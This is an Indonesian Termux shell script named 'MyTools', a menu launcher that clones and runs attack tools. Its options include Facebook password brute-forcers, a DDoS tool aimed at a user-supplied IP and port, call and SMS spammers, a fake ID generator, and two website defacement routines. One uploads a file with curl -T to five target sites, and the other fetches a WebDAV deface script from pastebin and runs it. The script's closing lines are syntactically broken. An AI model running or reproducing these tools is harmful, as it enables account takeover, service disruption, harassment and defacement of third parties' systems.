##########################################################
# Author     : Billal { Bl4ck_Dr460n			 #
# Name Tools : MyTools					 #
# Version    : 1.0					 #
# Code       : rooted@dr460n				 #
##########################################################
# [!] Gunakan Dengan Bijak Jangan SalahKan Tools Ini [!] #
##########################################################
#                        MyTeam				 #
##########################################################
#                   Black Cyber Army			 #
#              Indonesia Attacker Public   		 #
#                   Subang Cyber Team			 #
##########################################################
cd modul
biru='\033[34;1m' #biru
green='\e[0;32m' #hijau muda
daun='\033[32;1m' #ijo
purple='\033[35;1m' #purple
cyyan='\033[36;1m' #cyan
merah='\033[31;1m' #merah
putih='\033[37;1m' #pur
tai='\033[33;1m' #kuning
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear 
echo $tai"["$daun"!"$tai"]>"$merah" CTRL + C Detected !!!"
sleep 0.1
echo $tai"["$daun"!"$tai"]>"$merah" Tunggu 4 Detik"
sleep 4
echo
echo
exit
}

clear
echo $tai "["$daun"!"$tai"]"$merah "© Hak Cipta Milik Bl4ck Dr460n"
sleep 3
sh logo.sh

	echo
	echo
			echo $biru "[==========================]"
			echo $biru "["$tai"   GUNAKAN DENGAN BIJAK  "  $biru"]"
			echo $biru "[==========================]"
	echo		
	echo
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  1.Hack Facebook Target"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  2.Install Metasploit"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  3.Tools DDOS"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  4.SpamCall"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  5.KKKTP Generate"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  6.Mempercepat Sinyal"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  7.Install RED_HAWK"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  8.Hack Facebook Iqbalz"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  9.Yahoo Cloning"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  10.Report Facebook"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  11.Bot Komena { Sedang Perbaikan }"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  12.MultiSpam"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  13.Mempercantik Termux"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  14.Multi DDOS"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  15.Mempercantik Termux 2"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  16.Deface Method "$tai"Webdav"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  17.OSIF"
echo $merah "[]=======================[]"
echo
sleep 0.7
echo $merah "[]=======================[]"
echo $daun  "  0.Install Bahan"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  I.Info"
echo $merah "[]=======================[]"
sleep 0.4
echo $daun  "  E.Exit"
echo $merah "[]=======================[]"
sleep 0.1
echo $daun
sleep 0.2	
read -p  "[root@dr460n]>> " pilih

if [ $pilih = "1" ] || [ $pilih = "1" ]
then
sh logo1.sh
sleep 2
echo $tai "Sedang Menginstall Package Tambahan .."
sleep 1
pkg install python
pkg install python2 
pip2 install mechanize
echo $daun "Installing"
sleep 1
git clone https://github.com/Bl4ckDr460n/facebookbrute
mv facebookbrute $HOME
cd $HOME/facebookbrute
python2 brute.py
exit
fi
if [ $pilih = "2" ] || [ $pilih = "2" ]
then
clear
echo $daun "installing"
sleep 1
git clone https://github.com/4L13199/meTAInstall
mv meTAInstall $HOME
cd $HOME/meTAInstall
chmod 777 *
sh meTAInstall.sh
fi
if [ $pilih = "3" ] || [ $pilih = "3" ]
then
clear
echo $daun "Install Package Tambahan "
sleep 1
pkg install python
pkg install python2
echo $daun "Installing"
sleep 1
git clone https://github.com/Bl4ckDr460n/DDOS
mv DDOS $HOME
cd $HOME/DDOS
clear
echo $tai "Masukan IP Target"$daun
read -p "dr460n >>" target
echo
echo $tai "Masukan Port Target"$daun
read -p "dr460n >>" p
echo
echo $tai "Masukan Kecepatan"$daun
read -p "dr460n >>" t
python3 DDOS.py -s $target -p $p -t $t
fi
if [ $pilih = "4" ] || [ $pilih = "2" ]
then
clear
echo $daun "Install Package Tambahan"
sleep 1
pkg install php
pkg install cowsay
echo $daun "Installing"
sleep 1
git clone https://github.com/Bl4ckDr460n/spamcall
mv spamcall $HOME
cd $HOME/spamcall
php Call.php
exit
fi
if [ $pilih = "5" ] || [ $pilih = "5" ]
then
clear
echo $daun "Install Package Tambahan"
sleep 1
pkg install php
echo $daun "Installing"
sleep 1
git clone https://github.com/Bl4ckD460n/freekkktp
mv freekkktp $HOME
cd $HOME/freekkktp
php ktp.php
exit
fi
if [ $pilih = "6" ] || [ $pilih = "6" ]
then
clear
echo $tai
cowsay -f kiss.cow "BL4CKDR460N"
echo 	
echo			
echo	$cyyan "      Code By "$merah"Bl4ck_Dr460n"
echo
echo
echo
echo $daun
ping google.com
fi
if [ $pilih = "7" ] || [ $pilih = "7" ]
then
clear
echo $daun "Install Package Tambahan"
sleep 1
pkg install php
echo $daun "Installing"
sleep 1
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
php rhawk.php
exit
fi
if [ $pilih = "8" ] || [ $pilih = "8" ]
then
clear
echo $daun "Installing"
sleep 1
git clone https://github.com/IqbalzNoobs/fb-brute
mv fb-brute $HOME
cd $HOME/fb-brute
pip2 install mechanize
python2 brute.py
fi
if [ $pilih = "9" ] || [ $pilih = "9" ]
then
clear
echo $daun "Installing"
sleep 1
git clone https://github.com/FR13ND8/EmailVuln
mv EmailVuln $HOME
cd $HOMR/EmailVuln
python2 vuln.py
fi
if [ $pilih = "10" ] || [ $pilih = "10" ]
then
clear
echo $daun "Installing"
sleep 1
git clone https://github.com/IlayTamvan/Report
mv Report $HOME
cd $HOME/Report
unzip Report.zip
python2 Report.py
fi
if [ $pilih = "12" ] || [ $pilih = "12" ]
then
clear
git clone https://github.com/Bl4ckDr460n/MultiSpam
mv MultiSpam $HOME
cd $HOME/MultiSpam
sh MultiSpam.sh
exit
fi
if [ $pilih = "13" ] || [ $pilih = "13" ]
then
clear
cd modul
cp bash.bashrc $HOME/../usr/etc
bash $HOME/../usr/etc/bash.bashrc
fi
if [ $pilih = "14" ]
then
clear
cowsay -f dragon.cow "DR460N" | lolcat
echo
echo
echo $merah "["$tai"!"$merah"]"$biru"Simpan Di Luar Folder sdcard"$merah"["$tai"!"$merah"]"
echo
echo
echo $tai "Masukan Nama Script"
read -p "[root@dr460n]>> " sc
echo
echo $tai "Masukan Web ke 1" $daun
read -p "[root@dr460n]>> " k1
echo
echo $tai "Masukan Web Ke 2" $daun
read -p "[root@dr460n]>> " k2
echo
echo $tai "Masukan Web Ke 3" $daun
read -p "[root@dr460n]>> " k3
echo
echo $tai "Masukan Web Ke 4"$daun
read -p "[root@dr460n]>> " k4
echo
echo $tai "Masukan Web Ke 5"$daun
read -p "[toot@dr460n]>> " k5
echo
echo
curl -T /storage/emulated/0/$sc $k1
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k2
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k3
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k4
echo $daun "DONE !"
curl -T /storage/emulated/0/$sc $k5
echo $daun "DONE !"
echo
echo $tai "[]===============================[]"
echo $tai "[] Silahkan Cek $k1""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k2""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k3""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k4""              []"
echo $tai "[]                               []"
echo $tai "[] Silahkan Cek $k1""              []"
echo $tai "[]===============================[]"
exit
fi
if [ $pilih = "15" ]
then
clear
cd dll
cd home-termux
pkg install python2
python2 run.py
exit
fi
if [ $pilih = "16" ]
then
clear
pkg install wget
mkdir $HOME/Webdav
cd $HOME/Webdav
wget https://pastebin.com/raw/HnVyQPtR -O webdav.py
chmod 777 webdav.py
clear
echo $merah"["$daun"!"$merah"]"$tai"Simpan Script Di Luar Folder Sdcard"$merah"["$daun"!"$merah"]"
echo
echo $tai "Masukan Web/Situs Target"$daun
read -p "[root@dr460n]>> " target
echo
echo $tai "Masukan Nama Script [ index.html ]"$daun
read -p "[root@dr460n]>> " sc
python webdav.py $target $sc
exit
fi
if [ $pilih = "17" ]
then
clear
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/CiKu370/OSIF
mv OSIF $HOME
cd $HOME/OSIF
python2 osif.py
exit
fi
if [ $pilih ="0" ] || [ $pilih = "0" ]
then
clear
cd modul
sh install.sh
fi
# Exit
if [ $pilih = "E" ]
then
clear
echo $tai "Ya Udah Kalo Gak Mau Ngegunain Tools Ini"
echo $merah "Pelit Amat Sih Jadi Orang :)"
exit
fi
if [ $pilih = "I" ] || [ $pilih = "i" ]
then
clear
echo $merah "[]==========================[]"
echo $merah "[]"$daun"           INFO           "$merah"[]"
echo $merah "[]==========================[]"
echo $merah "[]"$daun"     TENTANG PRIBADI      "$merah"[]"
echo $merah "[]==========================[]"
echo $merah "[]"$daun" Author    : Bl4ck_Dr460n "$merah"[]"
echo $merah "[]"$daun" Nama      : Billal       "$merah"[]"
echo $merah "[]"$daun" Panggilan : Bl4ckD460n   "$merah"[]"
echo $merah "[]"$daun" Umur      : 13 = SD      "$merah"[]"
echo $merah "[]"$daun" No Telp   : 089xxxxxxxxx "$merah"[]"
echo $merah "[]"$daun" Youtube   : Hacker Cilik "$merah"[]"
echo $merah "[]==========================[]"
echo
echo $merah "[]==========================[]"
echo $merah "[]"$daun"      TENTANG TOOLS       "$merah"[]"
echo $merah "[]==========================[]"
echo $merah "[]"$daun" Name Tools : MyTools     "$merah"[]"
echo $merah "[]"$daun" Version    : 1.0         "$merah"[]"
echo $merah "[]"$daun" code       : dr460n      "$merah"[]"
echo $merah "[]==========================[] "
echo
echo $merah "[]XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[]"
echo $merah "[]"$daun"               MyGrup              "$merah"[]"
echo $merah "[]XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[]"
echo $merah "[] "$tai"1.Subang Cyber Army"
echo $merah "[] "$tai"2.Woll Cyber Army [ Admin ] "
echo $merah "[]XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[]"
echo
echo
echo $tai"["$daun"B"$tai"/"$daun"Q"$tai"]"
echo $biru "Pilih"
echo $daun
read -p "[root@dr460n]>> " back
fi
if [ $back = "B" ] || [ $back = "b" ]
then
clear
sh MyTools.sh
fi
if [ $back = "Q" ] || [ $back = "q" ]
then
clear
echo $tai "Ya Udah Klo Exit"
echo $daun "BY BY........"
exit
fi

*) clear
				echo $daun "Kesalahan"
				echo "Tunggu 4 Detik"
	echo "Mengembalikan Ke Awal"
			sleep 4

esac
done
done
